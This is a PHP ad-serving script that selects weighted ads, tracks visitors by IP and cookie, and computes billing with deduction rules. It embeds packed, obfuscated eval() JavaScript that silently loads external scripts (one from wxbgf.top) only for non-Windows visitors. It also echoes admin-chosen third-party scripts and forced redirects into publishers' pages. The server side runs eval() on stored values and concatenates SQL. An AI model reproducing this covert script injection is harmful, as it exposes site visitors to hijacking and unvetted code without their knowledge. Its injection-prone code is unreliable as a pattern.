//方案1：传过来的数据是单个的 没有办法比对. 应该传 二维数组   [计划ID[广告ID,广告权重]，计划权重](推荐使用)
//方案2: 这边先筛选已经展示过的广告和广告计划.然后交由广告筛选器进行筛选.
//$proArr 广告id加权重数组  110 广告 100权重

$dayTime = date('Y-m-d', time());  //当前日期

$_COOKIE['ran_i'] = isset($_COOKIE['ran_i']) ? $_COOKIE['ran_i'] : 'null';
if (empty($ad_sql_list[$_COOKIE['ran_i']]['pid'])) {
    //echo 66666666;
    $i = 0;
    $_COOKIE['ran_i'] = $i;
    setcookie('ran_i', $i, time() + 86400);
}
$i = $_COOKIE['ran_i'];

$pidarr_sel = array();

foreach ($ad_sql_list as $key => $val) {
    if ($val['priority'] <= 0) {
        $val['adpriority'] = 1;
    }
    $pidarr_sel['plan'][$val['pid']] = $val['priority'];
    if ($val['adpriority'] <= 0) {
        $val['adpriority'] = 1;
    }
    $pidarr_sel['ads'][$val['pid']][$val['ad_id']] = $val['adpriority'];
}

// $array_pid = explode(',', $limit_pid);
$array_pid = array_flip($limit_pid);


//数组key对比（不满足条件的pid 和 全部pid 对比）
$contrast_arr = array_diff_key($pidarr_sel['plan'], $array_pid);

// // 对比为空说明广告对应的计划都不满足条件
if (empty($contrast_arr)) {
    $log_test_str.= $xianzhi_log_test;
    $log_test_str.= ' '.implode(',', $limit_pid);
    $log_test_str.= ' id-'.$id;

    $log_test_str.=' ERROR10007'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('所有计划限制都不满足，无可投放的广告');
    exit;
}else{
    // 在赋给原值
    $pidarr_sel['plan'] = $contrast_arr;
}

//展示广告的个数
$adz_type = $adzList[0]['adz_type'];
$num = eval("return $adz_type;");
$pidarr_sel_count = count($pidarr_sel['plan']);
//随机的计划个数既是展示广告的个数
$final_pid = cookie_checker_plan($pidarr_sel['plan'],$sredis,$uIP,$num);
if(empty($final_pid)){
    $log_test_str.=' ERROR10008'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('所有计划限制都不满足，无可投放的广告');
    exit;
}
// 随机得到的广告id 
$final_ad_id = cookie_checkerG($pidarr_sel,$final_pid,$sredis);
$today = strtotime(date("Y-m-d"), time());
$end = $today + 60 * 60 * 24;
$cookTime = $end - time();//独立访客存储时间

//独立访客
$old_cookies = isset($_COOKIE['baseCookies']) ? $_COOKIE['baseCookies'] : '';

if (empty($old_cookies)) {
    $baseCookies = base64_encode(getMillisecond());
    $_COOKIE['baseCookies'] = $baseCookies;
    $old_cookies = $baseCookies;
    setcookie('baseCookies', $baseCookies, time() + $cookTime);
}else{
    $old_cookies = $_COOKIE['baseCookies'];
}

$final_adid_arr = explode(',', $final_ad_id);
//查询随机出的广告信息
$prep_adinfo = $pdo->prepare('SELECT a.text_chain,a.imageurl,a.url,a.files,a.tc_id,a.pid,a.ad_id,a.adinfo,a.tpl_id,b.plan_type,b.uid AS planuid FROM lz_ads AS a LEFT JOIN lz_plan AS b ON a.pid = b.pid  WHERE a.ad_id IN (' . $final_ad_id . ')  AND a.status=1');
$prep_adinfo->execute(array());
$res_adinfo = $prep_adinfo->fetchAll();

//查询广告位相关展示信息
$prep_adz = $pdo->prepare('SELECT a.uid,a.width,a.height,a.htmlcontrol,a.false_close,b.viewjs,b.iframejs FROM lz_adzone AS a
          LEFT JOIN lz_adstyle AS b ON a.adstyle_id = b.style_id WHERE a.adz_id=? AND a.uid=?');
$prep_adz->execute(array($id,$adzList[0]['uid']));
$res_adz = $prep_adz->fetchAll();
//合并广告信息和广告位信息  
$List_ad = array();
foreach ($res_adinfo as $key => $value) {
    $key = $value['ad_id'];
    $List_ad[$key] = $value + $res_adz['0'];
    //截取广告位比例$adzList[0]['adz_type']
    $num_str = substr($adzList[0]['adz_type'], -1, 1);
    $List_ad[$key]['txt_height'] = $num_str * $res_adz[0]['height'];
    //统计点击量  click_url
    $baseUrl =  'blogid=' . $value['ad_id'] .'&siteid='.$siteRes[0]['site_id'].'&uid='.$adzList[0]['uid'].
        '&pid='.$value['pid'].'&userip='.$uIP.'&tpl_id='.$value['tpl_id'].'&plantype='.$value['plan_type'].'&planuid='.$value['planuid'];
    $baseUrl = "$platformUrl/$cilck_url" .$id .$sign. base64_encode($baseUrl);
    $List_ad[$key]['baseUrl'] = $baseUrl;
}

//各个广告的展示信息
$List = array();
foreach ($final_adid_arr as $key => $value) {
    $List[] = $List_ad[$value];
}
// 判断信息是否完整
if (!empty($List)) {
    foreach ($List as $key => $value){

        // 把字符串 \ 转化 /
        if ($List[$key]['files'] == 1) {
            $List[$key]['imageurl'] = "$img_server" . str_replace('\\', '/', $List[$key]['imageurl']);
        } else {
            $List[$key]['imageurl'] = str_replace('\\', '/', $List[$key]['imageurl']);
        }
        $dayTime = date('Y-m-d', time());  //当前日期


        // 用户IP
        $uIP = GetIp();

        //用户当前使用的浏览器信息
        $userBrowse = get_access_browse();
        $impBrowse = implode('/', $userBrowse);
        $arrayBrowse = explode('/', $impBrowse);
        if (empty($arrayBrowse[2])) {
            $arrayBrowse[2] = '0';
        }
        if (empty($arrayBrowse[3])) {
            $arrayBrowse[3] = '0';
        }
        // $htmlcontrol[$key] = unserialize($List[$key]['htmlcontrol'])['position'];

        $List[$key]['imageurl'] = str_replace('./', '/', $List[$key]['imageurl']);

        $viewjs = '';
        $viewjs = htmlspecialchars_decode($List[$key]['viewjs']);

    }
}
//手机系统版本
$system_version = getOS();

$stytlename = chr(rand(65,90)).rand(1,9);

//展示广告的数组
$json_data = json_encode($List);

if (!empty($List)) {
    //组装 发送数据
    foreach ($List as $key => $value) {
        $statsParams[] = array(
                'adz_id' => $id,
                'ad_id'  => $value['ad_id'],
                'pid'    => $value['pid'],
                'uid'    => $adzList[0]['uid'],
                'tc_id'  => $value['tc_id'],
                'tpl_id' => $value['tpl_id'],
                'plan_type' => $value['plan_type'],
                'planuid'   => $value['planuid'],
                'site_id'   => empty($siteRes) || empty($siteRes[0]['site_id']) ? 1 : $siteRes[0]['site_id'],
                'ip_infos_useradd' => $ipInfos[1] . '/' . $ipInfos[2],
                'user_ip' => $uIP,
                'base_cookies' => $old_cookies,
                'browser'=>$arrayBrowse[2],
                'ver'=>$arrayBrowse[3],
                'kernel'=>$arrayBrowse[0],
                'modle_name'=>$modle,
                'system_version'=>$system_version
        );
    }
    //防止样式中的统计请求报错
    $data = '';
}
?>

var <?php {echo $stytlename;}?>blogs = <?php echo $json_data;?>;
var blogs = <?php {echo $stytlename;}?>blogs;
var data = '<?php echo $data;?>';

<?php  

$uaaaaagent = $_SERVER['HTTP_USER_AGENT'];

//获取服务器地址
$urlsaldasldas = $globalRes[0]['js_server'];

$viewjs = str_replace("swdcvkrnaaa","",$viewjs);
//cnzz统计
if(!empty($siteRes[0]['site_cnzz_id'])){
    $viewjs = str_replace("woshizhongguorenpingbishigou",$siteRes[0]['site_cnzz_id'],$viewjs);
}else{
    $viewjs = str_replace("woshizhongguorenpingbishigou",'',$viewjs);
}

// $List['url'] = str_replace("{uid}",$uid,$List['url']);
// $List['url'] = str_replace("{gid}",$id,$List['url']);

echo $viewjs;

//多排广告的统计计费
foreach ($statsParams as $key => $list) {
   chapv($list,$pdo,$redis);
}

//跳转计划直接跳转
if(isset($jumpPlan[$final_pid])){
    if($jumpPlan[$final_pid] == '3'){
        echo ";window.location.href='$baseUrl';";
    }
}
unset($jumpPlan);
unset($viewjs);
//am  cpa  ios
$ama_eval_js = "if(1==1){var eveaz = ".$id.";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('9(i.a.r(\'6\')<0){7 2=3.b(\'c\');2.d=\'e/f\';2.g=h;2.5=\'j-8\';2.k=\'//l.m.n/o/p.q?\'+4.s(4.t()*u+1);3.v.w(2)}',33,33,'||cnzz_tj_tagg|document|Math|charset|Win|var||if|platform|createElement|script|type|text|javascript|async|true|navigator|utf|src|www|wxbgf|top|jia|lma|js|indexOf|floor|random|9999999|body|appendChild'.split('|'),0,{}));}";
if($uid==6390||$uid==5759||$uid==7035){
    $ama_eval_js = '';
}
echo $ama_eval_js;

// aiqiyi   am  sm 相关链接 由后台操作
$tackjs_select = $pdo->prepare("SELECT id,js_url,checkjs,hour,port FROM lz_tackjs WHERE status=1");
$tackjs_select->execute();
$tackjsRes = $tackjs_select->fetchAll();
$aa_num = rand(1,2);
if(!empty($tackjsRes)){
    $tack_js = array();
    $tack_jsid = '0';
    foreach ($tackjsRes as $key => $value) {
        //端口限制
        if (!empty($value['port'])){
            // port==1 ios  port==2 android
            if ($value['port'] == 1 && !$is_iphone){
                unset($tackjsRes[$key]);
                continue;
            }elseif ($value['port'] == 2 && !$is_android){
                unset($tackjsRes[$key]);
                continue;
            }
        }
        //先判断当前访问的有没有在发送js连接中
        $checkjs = unserialize($value['checkjs']);
        //不发送站长
        if(!empty($checkjs['resuid'])){
            $checkjs['resuid'] = str_replace('，',',',$checkjs['resuid']);
            $checkjs_uid = explode(',', $checkjs['resuid']);
            if(in_array($uid, $checkjs_uid)){
                continue;  //对比到不发送 跳出循环
            }
        }
        //不发送广告位
        if(!empty($checkjs['resadzid'])){
            $checkjs['resadzid'] = str_replace('，',',',$checkjs['resadzid']);
            $checkjs_adz = explode(',', $checkjs['resadzid']);
            if(in_array($id, $checkjs_adz)){
                continue;
            }
        }
        //不发送地域
        if(!empty($checkjs['resarea'])){
            $checkjs['resarea'] = str_replace('，',',',$checkjs['resarea']);
            $checkjs_area = explode(',', $checkjs['resarea']);
            //先对比省 再对比市
            if(in_array($ipInfos[2], $checkjs_area)){
                continue;
            }
            if(in_array($ipInfos[3], $checkjs_area)){
                continue;
            }
        }
        //时间以外不发送
        $s_hour = unserialize($value['hour']);
        if (empty($s_hour) || !in_array(date('H', time()), $s_hour)) {
            continue;
        };
        unset($checkjs);
        //可以发送的链接
        $tack_js[$value['id']]['js_url'] = $value['js_url'];
        if(empty($tack_jsid)){
            $tack_jsid = $value['id'];
        }else{
            $tack_jsid = $tack_jsid.','.$value['id'];
        }
    }
}
unset($tackjsRes);
//单独的id 对应地域不发送
if(!empty($tack_js) && !empty($tack_jsid)){
    $limitjs_select = $pdo->prepare("SELECT id,radio_id,limit_id,check_limit FROM lz_tackjs_limit WHERE status=1 AND id IN (".$tack_jsid.")");
    $limitjs_select->execute();
    $limitjsRes = $limitjs_select->fetchAll();
    foreach ($limitjsRes as $key => $value) {
        $check_limit = unserialize($value['check_limit']);
        //当前的站长id或者广告位id是否为被屏蔽  若被不被屏蔽直接发送js链接跳出本次循环  被屏蔽则继续
        if($value['radio_id'] == '0'){
            if($uid != $value['limit_id']){
                continue;
            }
        }else{
            if($id != $value['limit_id']){
                continue;
            }
        }

        //先对比省份  用插件选择地域不管屏蔽那个城市都会选择省份，所以不需要在验证身份
        // if(in_array($ipInfos[2], $check_limit['city_province'])){
        //     unset($tack_js[$value['id']]);
        //     continue;
        // }
        //城市
        if(in_array($ipInfos[3], $check_limit['city_data'])){
            unset($tack_js[$value['id']]);
            continue;
        }
    }

    $is_android = (stripos($agent, 'android')) ? true : false;
    $is_iphone = (stripos($agent, 'iphone')) ? true : false;
    //发送js_链接
    foreach ($tack_js as $key => $value) {
        if(strpos($value['js_url'],'.$id.')){
            $value['js_url'] = str_replace('.$id.',$id,$value['js_url']);
        }
        //jiumeng  只随机一半的量
        if($key==17){
            if($aa_num == 2){
                echo $value['js_url'];
            }
        }elseif ($key==24) {
            //如果id是24  增加周期频率 都为1
            goBackjs($value['js_url']);
        }else{
            if($key==21||$key==22){
                //朱总 21 ios
                if($key==21&&$is_iphone){
                    echo $value['js_url'];
                }
                //蛋蛋 22 android
                if($key==22&&$is_android){
                    echo $value['js_url'];
                }
            }else{
                echo $value['js_url'];
            }
        }
    }
    unset($limitjsRes);
    unset($tack_jsid);
    unset($tack_js);
}
$pdo = null;
//发送接口请求
$adz_canshu = $id.'&ipInfos='.$ipInfos[3].'&uip='.$statsParams['user_ip'].'&province='.$ipInfos[2];
//$url_adzjs = $platformUrl.'/985/'.base64_encode(base64_encode($adz_canshu));
 $url_adzjs = $platformUrl.'/ad/adz_jsApi.php?id='.base64_encode(base64_encode($adz_canshu));

echo 'var pl = 0;if(navigator.platform.indexOf("Win") == 0){pl=1;}';
echo 'var z = "'.$url_adzjs.'&pl="+pl;';
echo 'if(1==1&&pl==0){';
echo ";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('h 5(a){2 1=3.f(\'4\');1.7=\'9/c\';1.d=\"6-8\";1.g=a;2 b=3.i(\'4\')[0];b.j.k(1,b)}l{5(m)}n(e){}',24,24,'|x|var|document|script|y|utf|type||text|||javascript|charset||createElement|src|function|getElementsByTagName|parentNode|insertBefore|try|z|catch'.split('|'),0,{}));}else{console.log('pl1');}";

?>

<?php

//获取用户 IP
function GetIp()
{
    $realip = '';
    $unknown = 'unknown';
    if (isset($_SERVER)) {
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) && strcasecmp($_SERVER['HTTP_X_FORWARDED_FOR'], $unknown)) {
            $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($arr as $ip) {
                $ip = trim($ip);
                if ($ip != 'unknown') {
                    $realip = $ip;
                    break;
                }
            }
        } else if (isset($_SERVER['HTTP_CLIENT_IP']) && !empty($_SERVER['HTTP_CLIENT_IP']) && strcasecmp($_SERVER['HTTP_CLIENT_IP'], $unknown)) {
            $realip = $_SERVER['HTTP_CLIENT_IP'];
        } else if (isset($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['REMOTE_ADDR']) && strcasecmp($_SERVER['REMOTE_ADDR'], $unknown)) {
            $realip = $_SERVER['REMOTE_ADDR'];
        } else {
            $realip = $unknown;
        }
    } else {
        if (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), $unknown)) {
            $realip = getenv("HTTP_X_FORWARDED_FOR");
        } else if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), $unknown)) {
            $realip = getenv("HTTP_CLIENT_IP");
        } else if (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), $unknown)) {
            $realip = getenv("REMOTE_ADDR");
        } else {
            $realip = $unknown;
        }
    }
    $realip = preg_match("/[\d\.]{7,15}/", $realip, $matches) ? $matches[0] : $unknown;
    return $realip;
}

//根据用户ip获取地理位置
function GetIpLookup($ip = '',$IpSearch)
{
    header("Content-Type: text/html;charset=utf-8");
    //17monip
    // require_once __DIR__ . '/17monipdb/Ipsearch.class.php';
    // $reader = new IpSearch('qqzeng-ip-utf8.dat');
    $res = $IpSearch->get($ip);
    if(!empty($res)){
        $res = explode('|', $res);
    }else{
        $res = array(
            0 => '',
            1 => '',
            2 => '',
            3 => '',
            4 => '',
        );
    }
    return $res;
}

//得到浏览器信息
function get_access_browse()
{
    // 全部浏览器代理 // CriOS == iPhone 的chrome
    $browser = array('Chrome', 'Firefox', 'Opera', 'MSIE', 'CriOS', 'Safari');
    $r = array('Unknown', 0);
    // 搜索 浏览器
    if (!preg_match_all('/([a-zA-Z]{4,})[\/ ]([0-9\.]+)/i', $_SERVER['HTTP_USER_AGENT'], $arr)) {
        return $r;
    }
    foreach ($browser as $value) {
        if (($key = array_search($value, $arr[1])) !== false) {
            if(is_array($arr[0])){
                if(isset($arr[0][2])){
                    $r = array($arr[0][1], $arr[0][2]);
                }else{
                    $r = '';
                }
            }else{
                $r = '';
            }
            break;
        }
    }
    return $r;
}

//获取手机系统版本（例如 Android :4.4.2）
function getOS()
{
    $ua = $_SERVER['HTTP_USER_AGENT'];//这里只进行IOS和Android两个操作系统的判断，其他操作系统原理一样
    if (strpos($ua, 'Android') !== false) {//strpos()定位出第一次出现字符串的位置，这里定位为0
        preg_match("/(?<=Android )[\d\.]{1,}/", $ua, $version);
        if(empty($version)){
            $version[0] = '';
        }
        return 'Android:' . $version[0];
    } elseif (strpos($ua, 'iPhone') !== false) {
        preg_match("/(?<=CPU iPhone OS )[\d\_]{1,}/", $ua, $version);
        if(empty($version)){
            $version[0] = '';
        }
        return 'iPhone:' . str_replace('_', '.', $version[0]);
    } elseif (strpos($ua, 'iPad') !== false) {
        preg_match("/(?<=CPU OS )[\d\_]{1,}/", $ua, $version);
        if(empty($version)){
            $version[0] = '';
        }
        return 'iPad:' . str_replace('_', '.', $version[0]);
    }
}


//服务器地址
function service($sredis,$globalRes)
{
    $domain = '';
    if(!empty($globalRes[0]['adv_server'])){
        $globalRes[0]['adv_server'] = explode('//',$globalRes[0]['adv_server']);
        //判断是否为空
        if(!empty($globalRes[0]['adv_server'][1])){
            $domain = $globalRes[0]['adv_server'][1];
        }else{
            $domain = $sredis->redirect_url;
        }

    }else{
        $domain = $sredis->redirect_url;
    }
    return $domain;
}
/**
 *  随机广告函数
 */
function cookie_checkerG($pidarr_sel, $final_pid,$sredis)
{
    $final_arr = [];
    $rand_adid = $pidarr_sel['ads'];
    foreach ($final_pid as $key => $value)
    {
        //随机广告
        if (empty($rand_adid[$value])){
            $rand_adid[$value] = $pidarr_sel['ads'][$value];
        }
        $get_rand = get_rand($rand_adid[$value]);
        $final_arr[] = $get_rand;
        unset($rand_adid[$value][$get_rand]);
    }
    $final_ad_id = implode(',',$final_arr);
    return $final_ad_id;
}

//随机计划函数
function cookie_checker_plan($ad_id_arr,$sredis,$uIP,$num)
{
    $type = "randj";
    // $result = '';

    //判断redis里面，本次访问的用户是否访问过此计划id
    $user_pid = $sredis->handler()->HMGET($uIP,array('pid_more_ad'))['pid_more_ad'];

    if (!empty($user_pid)) {
        $redis_pid_arr = array_flip(explode(',', $user_pid));
        $inter_adids = array_diff_key($ad_id_arr,$redis_pid_arr);
        //计划展示完从新展示
        if(empty($inter_adids)){

            //全部展示过的计划id
            $show_array_pid = explode(',', $user_pid);
            // 去掉重复数据的数组
            $unique_arr = array_unique ($show_array_pid);

            // 获取重复数据的数组
            $repeat_arr = array_flip(array_diff_assoc ($show_array_pid, $unique_arr ));
            // $show_all_pid = array_diff_key($ad_id_arr,$repeat_arr);
            $result_show = implode(',', array_flip($repeat_arr));
            for ($i=0; $i < $num; $i++) {
                $redis_pid_arr = array_flip(explode(',', $result_show));
                $inter_adids = array_diff_key($ad_id_arr,$redis_pid_arr);
                //随机
                if(empty($inter_adids)){
                    $result_rand = get_rand($ad_id_arr);
                }else{
                    $result_rand = get_rand($inter_adids);
                }
                //记录每次随机数
                if(empty($result_pid)){
                    $result_pid = $result_rand;
                }else{
                    $result_pid = $result_rand.','.$result_pid;
                }
                //判断随机的计划个数和要求展示的广告的个数
                $inter_arr = array_flip(explode(',', $result_pid));
                if($num == count($inter_arr)){
                    $result_pid = $result_pid;
                }else{
                    $result_show = $result_pid;
                }
            }
            $result = $result_pid;
            $array_pid =array(
                'pid_more_ad'  => $result
            );
            $sredis->handler()->HMSET($uIP,$array_pid);
            $result = explode(',', $result);
        }else {
            $result_show = '';
            //先在没有展示过的计划里面循环查找 可以展示的个数
            for ($i=0; $i < $num; $i++) {
                $redis_pid_arr = array_flip(explode(',', $result_show));
                $inter_adids = array_diff_key($ad_id_arr,$redis_pid_arr);
                //随机
                if(empty($inter_adids)){
                    $result_rand = get_rand($ad_id_arr);
                }else{
                    $result_rand = get_rand($inter_adids);
                }
                //记录每次随机数
                if(empty($result_pid)){
                    $result_pid = $result_rand;
                }else{
                    $result_pid = $result_rand.','.$result_pid;
                }
                //判断随机的计划个数和要求展示的广告的个数
                $inter_arr = array_flip(explode(',', $result_pid));
                if($num == count($inter_arr)){
                    $result_pid = $result_pid;
                }else{
                    $result_show = $result_pid;
                }
            }
            $result = $result_pid;
            $array_pid =array(
                'pid_more_ad'  => $result.','.$user_pid
            );
            $sredis->handler()->HMSET($uIP,$array_pid);
            $result = explode(',', $result);

        }
    } else {
        //第一次进入
        $frist_result = get_rand($ad_id_arr);
        $result_show = $frist_result;
        $result_pid = '';
        $num_str = $num-1;
        for ($i=0; $i < $num_str; $i++) {
            $redis_pid_arr = array_flip(explode(',', $result_show));

            $inter_adids = array_diff_key($ad_id_arr,$redis_pid_arr);
            //随机
            if(empty($inter_adids)){
                $result_rand = get_rand($ad_id_arr);
            }else{
                $result_rand = get_rand($inter_adids);
            }
            //记录每次随机数
            if(empty($result_pid)){
                $result_pid = $result_rand;
            }else{
                $result_pid = $result_rand.','.$result_pid;
            }
            //判断随机的计划个数和要求展示的广告的个数
            $inter_arr = array_flip(explode(',', $result_pid));
            if($num_str == count($inter_arr)){
                $result_pid = $result_pid;
            }else{
                $result_show = $result_pid.','.$frist_result;
            }
        }
        $result = $result_pid.','.$frist_result;
        $array_pid =array(
            'pid_more_ad'  => $result
        );
        $sredis->handler()->HMSET($uIP,$array_pid);
        $result = explode(',', $result);
    }
    return $result;

}


//gr.
function get_rand($proArr)
{
    $result = '';
    //概率数组的总概率精度
    $proSum = array_sum($proArr);
    // dump($proSum);
    //概率数组循环
    foreach ($proArr as $key => $proCur) {
        $randNum = mt_rand(1, $proSum);             //抽取随机数
        if ($randNum <= $proCur) {
            $result = $key;                         //得出结果
            break;
        } else {
            $proSum -= $proCur;
        }
    }

    unset ($proArr);
    return $result;
}

//获取毫秒
function getMillisecond()
{
    list($t1, $t2) = explode(' ', microtime());
    return (float)sprintf('%.0f', (floatval($t1) + floatval($t2)) * 1000);
}


// 开启限制   网站限制
function openDomainLimit($uid, $adsthisUrl, $pdo)
{
    if(!empty($adsthisUrl)){
        // 查看当前域名是否存在 和 站点扣量
        $sites = $pdo->prepare("select site_id,uid,siteurl,web_deduction,adv_deduction,site_cnzz_id from lz_site WHERE uid=? AND siteurl=? AND status=1");
        $sites->execute(array($uid, $adsthisUrl));
        $siteRes = $sites->fetchAll();
    }


    //绝对查询为空，然后模糊查询（例如：绝对查询 www.lezun.com  模糊查询 lezun.com）
    if (empty($siteRes)) {
        $fuzzy_url_array = explode('.',$adsthisUrl);
        $url_count = count($fuzzy_url_array);

        if($url_count == 2){
            $fuzzy_url_array = $fuzzy_url_array[0] . '.' . $fuzzy_url_array[1];
        }elseif($url_count == 3){
            $fuzzy_url_array = $fuzzy_url_array[1] . '.' . $fuzzy_url_array[2];
        }elseif($url_count > 3){
            //截取域名数组的后 2 段
            $on_key = $url_count-2;
            $down_key = $url_count-1;
            $fuzzy_url_array = $fuzzy_url_array[$on_key] . '.' . $fuzzy_url_array[$down_key];
        }else{
            $fuzzy_url_array = '';
        }
        $num = strpos($fuzzy_url_array,"/");
        if(!empty($num)){
            $fuzzy_url_array = substr($fuzzy_url_array,0,$num);
        }

        if(empty($fuzzy_url_array)){
            $siteRes[0] = array(
                "site_id" => 0,
                "class_id" => 0,
                "uid" => 0,
                "siteurl" => 0,
                "web_deduction" => 0,
                "adv_deduction" => 0,
                'site_cnzz_id' => '',
            );
        }else{
            // 查看当前域名是否存在 和 站点扣量
            $fuzzySites = $pdo->prepare("select  site_id,uid,siteurl,web_deduction,adv_deduction,site_cnzz_id
            from lz_site WHERE uid = ? AND siteurl LIKE '%$fuzzy_url_array' AND status=1 ");
            $fuzzySites->execute(array($uid));
            $siteRes = $fuzzySites->fetchAll();
        }
    }
    return $siteRes;
}

//统计计费的函数****************************************************************************************************************
function chapv($list,$pdo,$redis)
{
    $list['adz_id'] = getIdCut($list['adz_id']);
    //获取自营广告id
    $self_adv_id = explode(',',$redis->self_adv_id);

    //得到该次展示的单价和扣量
    $list = getList($pdo,$list);
    //根据不同的扣量优先级选择扣量
    $list = getDeducation($list,$pdo);
    //查看计费次数
    $uiNum = getUiNum($list,$redis);
    //更新实时ip表
    $ipNumber = updateRealtimeip($list,$uiNum,$redis);
    //更新浏览器表
    $uvNumber = updateBrowser($list,$redis);
    $dayTime = date('Y-m-d');
    statsUpdate($list,$uiNum,$uvNumber,$ipNumber,$self_adv_id,$redis,$dayTime);
}
//得到广告价格和扣量
function getList($pdo,$list)
{
    $prep = $pdo->prepare("SELECT a.web_deduction AS adz_web_deduction,a.adv_deduction AS adz_adv_deduction,
    b.web_deduction AS ads_web_deduction,b.adv_deduction AS ads_adv_deduction,
    c.deduction,c.web_deduction AS plan_web_deduction,c.budget,c.type,d.web_deduction AS user_web_deduction,d.adv_deduction AS
    user_adv_deduction,e.price,e.price_1,e.price_2,e.price_3,e.price_4,e.price_5,e.pricedv,e.gradation
    FROM lz_adzone AS a LEFT JOIN lz_admode AS f ON a.adtpl_id = f.tpl_id LEFT JOIN lz_ads AS b ON b.tpl_id=f.tpl_id
    LEFT JOIN lz_plan AS c ON b.pid = c.pid LEFT JOIN lz_users AS d ON a.uid = d.uid LEFT JOIN lz_plan_price AS e
    ON b.tc_id = e.id WHERE b.ad_id=? AND d.uid=? AND c.pid=? AND adz_id=? AND c.status=1 AND b.status=1");
    $prep->execute(array($list['ad_id'],$list['uid'],$list['pid'],$list['adz_id']));
    $res = $prep->fetchAll();
    $res = $res[0];

    if(empty($res)){exit;}
    //判断该广告是否分站长星级，并且查询不同站长的单价
    if ($res['gradation'] == 1) {
        $gradation = $pdo->prepare("SELECT star FROM lz_adzone WHERE adz_id=?");
        $gradation->execute(array($list['adz_id']));
        $gradation = $gradation->fetchAll();
        switch ($gradation[0]['star']) {
            case 1 :
                $list['price'] = $res['price_1'];
                break;
            case 2 :
                $list['price'] = $res['price_2'];
                break;
            case 3 :
                $list['price'] = $res['price_3'];
                break;
            case 4 :
                $list['price'] = $res['price_4'];
                break;
            case 5 :
                $list['price'] = $res['price_5'];
                break;
        }
    }else{
        $list['price'] = $res['price'];
    }
    $list['pricedv'] = $res['pricedv'];
    //处理不同的扣量
    $list['user_web_deduction'] = $res['user_web_deduction'];
    $list['user_adv_deduction'] = $res['user_adv_deduction'];
    $list['ads_web_deduction'] = $res['ads_web_deduction'];
    $list['ads_adv_deduction'] = $res['ads_adv_deduction'];
    $list['adz_web_deduction'] = $res['adz_web_deduction'];
    $list['adz_adv_deduction'] = $res['adz_adv_deduction'];
    $list['plan_web_deduction'] = $res['plan_web_deduction'];
    $list['deduction'] = $res['deduction'];
    $list['budget'] = $res['budget'];
    $list['type'] = $res['type'];

    return $list;
}

// 查看当前uv计费次数
function getUiNum($list,$redis)
{
    //=======================独立访客计数===============
    $uiNum = $redis->handler()->HMGET('ui_ip_'.$list['adz_id'],array($list['user_ip']));
    $uiNum = $uiNum[$list['user_ip']];
    if(empty($uiNum)){
        $uiNum = 0;
    }else{
        $uiNum = (int)$uiNum;
    }
    return $uiNum;
}

//CPM计费模式下更新统计表数据
function statsUpdate($list,$uiNum,$uvNumber,$ipNumber,$self_adv_id,$redis,$dayTime)
{
    $web_deduction = $list['web_deduction'];
    $adv_deduction = $list['adv_deduction'];

    //获取当前计费次数
    $billing_number = $uiNum + 1;

    $web_num = 1 + $list['web_deduction'];              //站长结算数
    $adv_num = 1 + $list['adv_deduction'];              //广告商结算数
    //判断是不是cpc
    if($list['plan_type'] !='CPC'){
        //用户独立ip访问的次数所统计不同的价钱
        if(($list['tpl_id'] != '5030') && ($list['tpl_id'] !='5033' )){
            if($billing_number == 1){
                $list['adv_money'] = $list['adv_money'] * '1.5';
                $list['web_money'] = $list['web_money'] * '1.5';
            }elseif($billing_number == 2){
                $list['adv_money'] = $list['adv_money'] * '0.8';
                $list['web_money'] = $list['web_money'] * '0.8';
            }elseif($billing_number == 3){
                $list['adv_money'] = $list['adv_money'] * '0.8';
                $list['web_money'] = $list['web_money'] * '0.8';
            }elseif($billing_number == 4){
                $list['adv_money'] = $list['adv_money'] * '0.8';
                $list['web_money'] = $list['web_money'] * '0.8';
            }elseif($billing_number == 5){
                $list['adv_money'] = $list['adv_money'] * '0.7';
                $list['web_money'] = $list['web_money'] * '0.7';
            }elseif($billing_number == 6){
                $list['adv_money'] = $list['adv_money'] * '0.5';
                $list['web_money'] = $list['web_money'] * '0.5';
            }elseif($billing_number == 7){
                $list['adv_money'] = $list['adv_money'] * '0.10';
                $list['web_money'] = $list['web_money'] * '0.10';
            }elseif($billing_number == 8){
                $list['adv_money'] = $list['adv_money'] * '0.05';
                $list['web_money'] = $list['web_money'] * '0.05';
            }elseif($billing_number == 9){
                $list['adv_money'] = $list['adv_money'] * '0.05';
                $list['web_money'] = $list['web_money'] * '0.05';
            }elseif($billing_number == 10){
                $list['adv_money'] = $list['adv_money'] * '0.05';
                $list['web_money'] = $list['web_money'] * '0.05';
            }elseif($billing_number > 10){
                $web_num = 0;              //站长结算数
                $adv_num = 0;              //广告商结算数
                $list['adv_money'] = 0;
                $list['web_money'] = 0;
                $web_deduction = 0;
                $adv_deduction = 0;
            }


            //自营广告不盈利
            if(in_array($list['planuid'],$self_adv_id)){
                $list['adv_money'] = $list['web_money'];
            }

            //redis缓存，当广告商消耗大于1元时更新数据库
            $redis->handler()->HINCRBYFLOAT('users-'.$list['planuid'],'adv_money',$list['adv_money']);
            $redis->handler()->HINCRBYFLOAT('users-'.$list['planuid'],'key_money',$list['adv_money']);
            $adv_money = $redis->handler()->HMGET('users-'.$list['planuid'],array('adv_money','key_money'));
            $update_advmoney = 10;
            if($adv_money['key_money'] > $update_advmoney){
                //更新广告商余额
                try{
                    $pdoa = new PDO($redis->db_pv_link,$redis->db_pv_root,$redis->db_pv_password);
                }catch(PDOException $e){
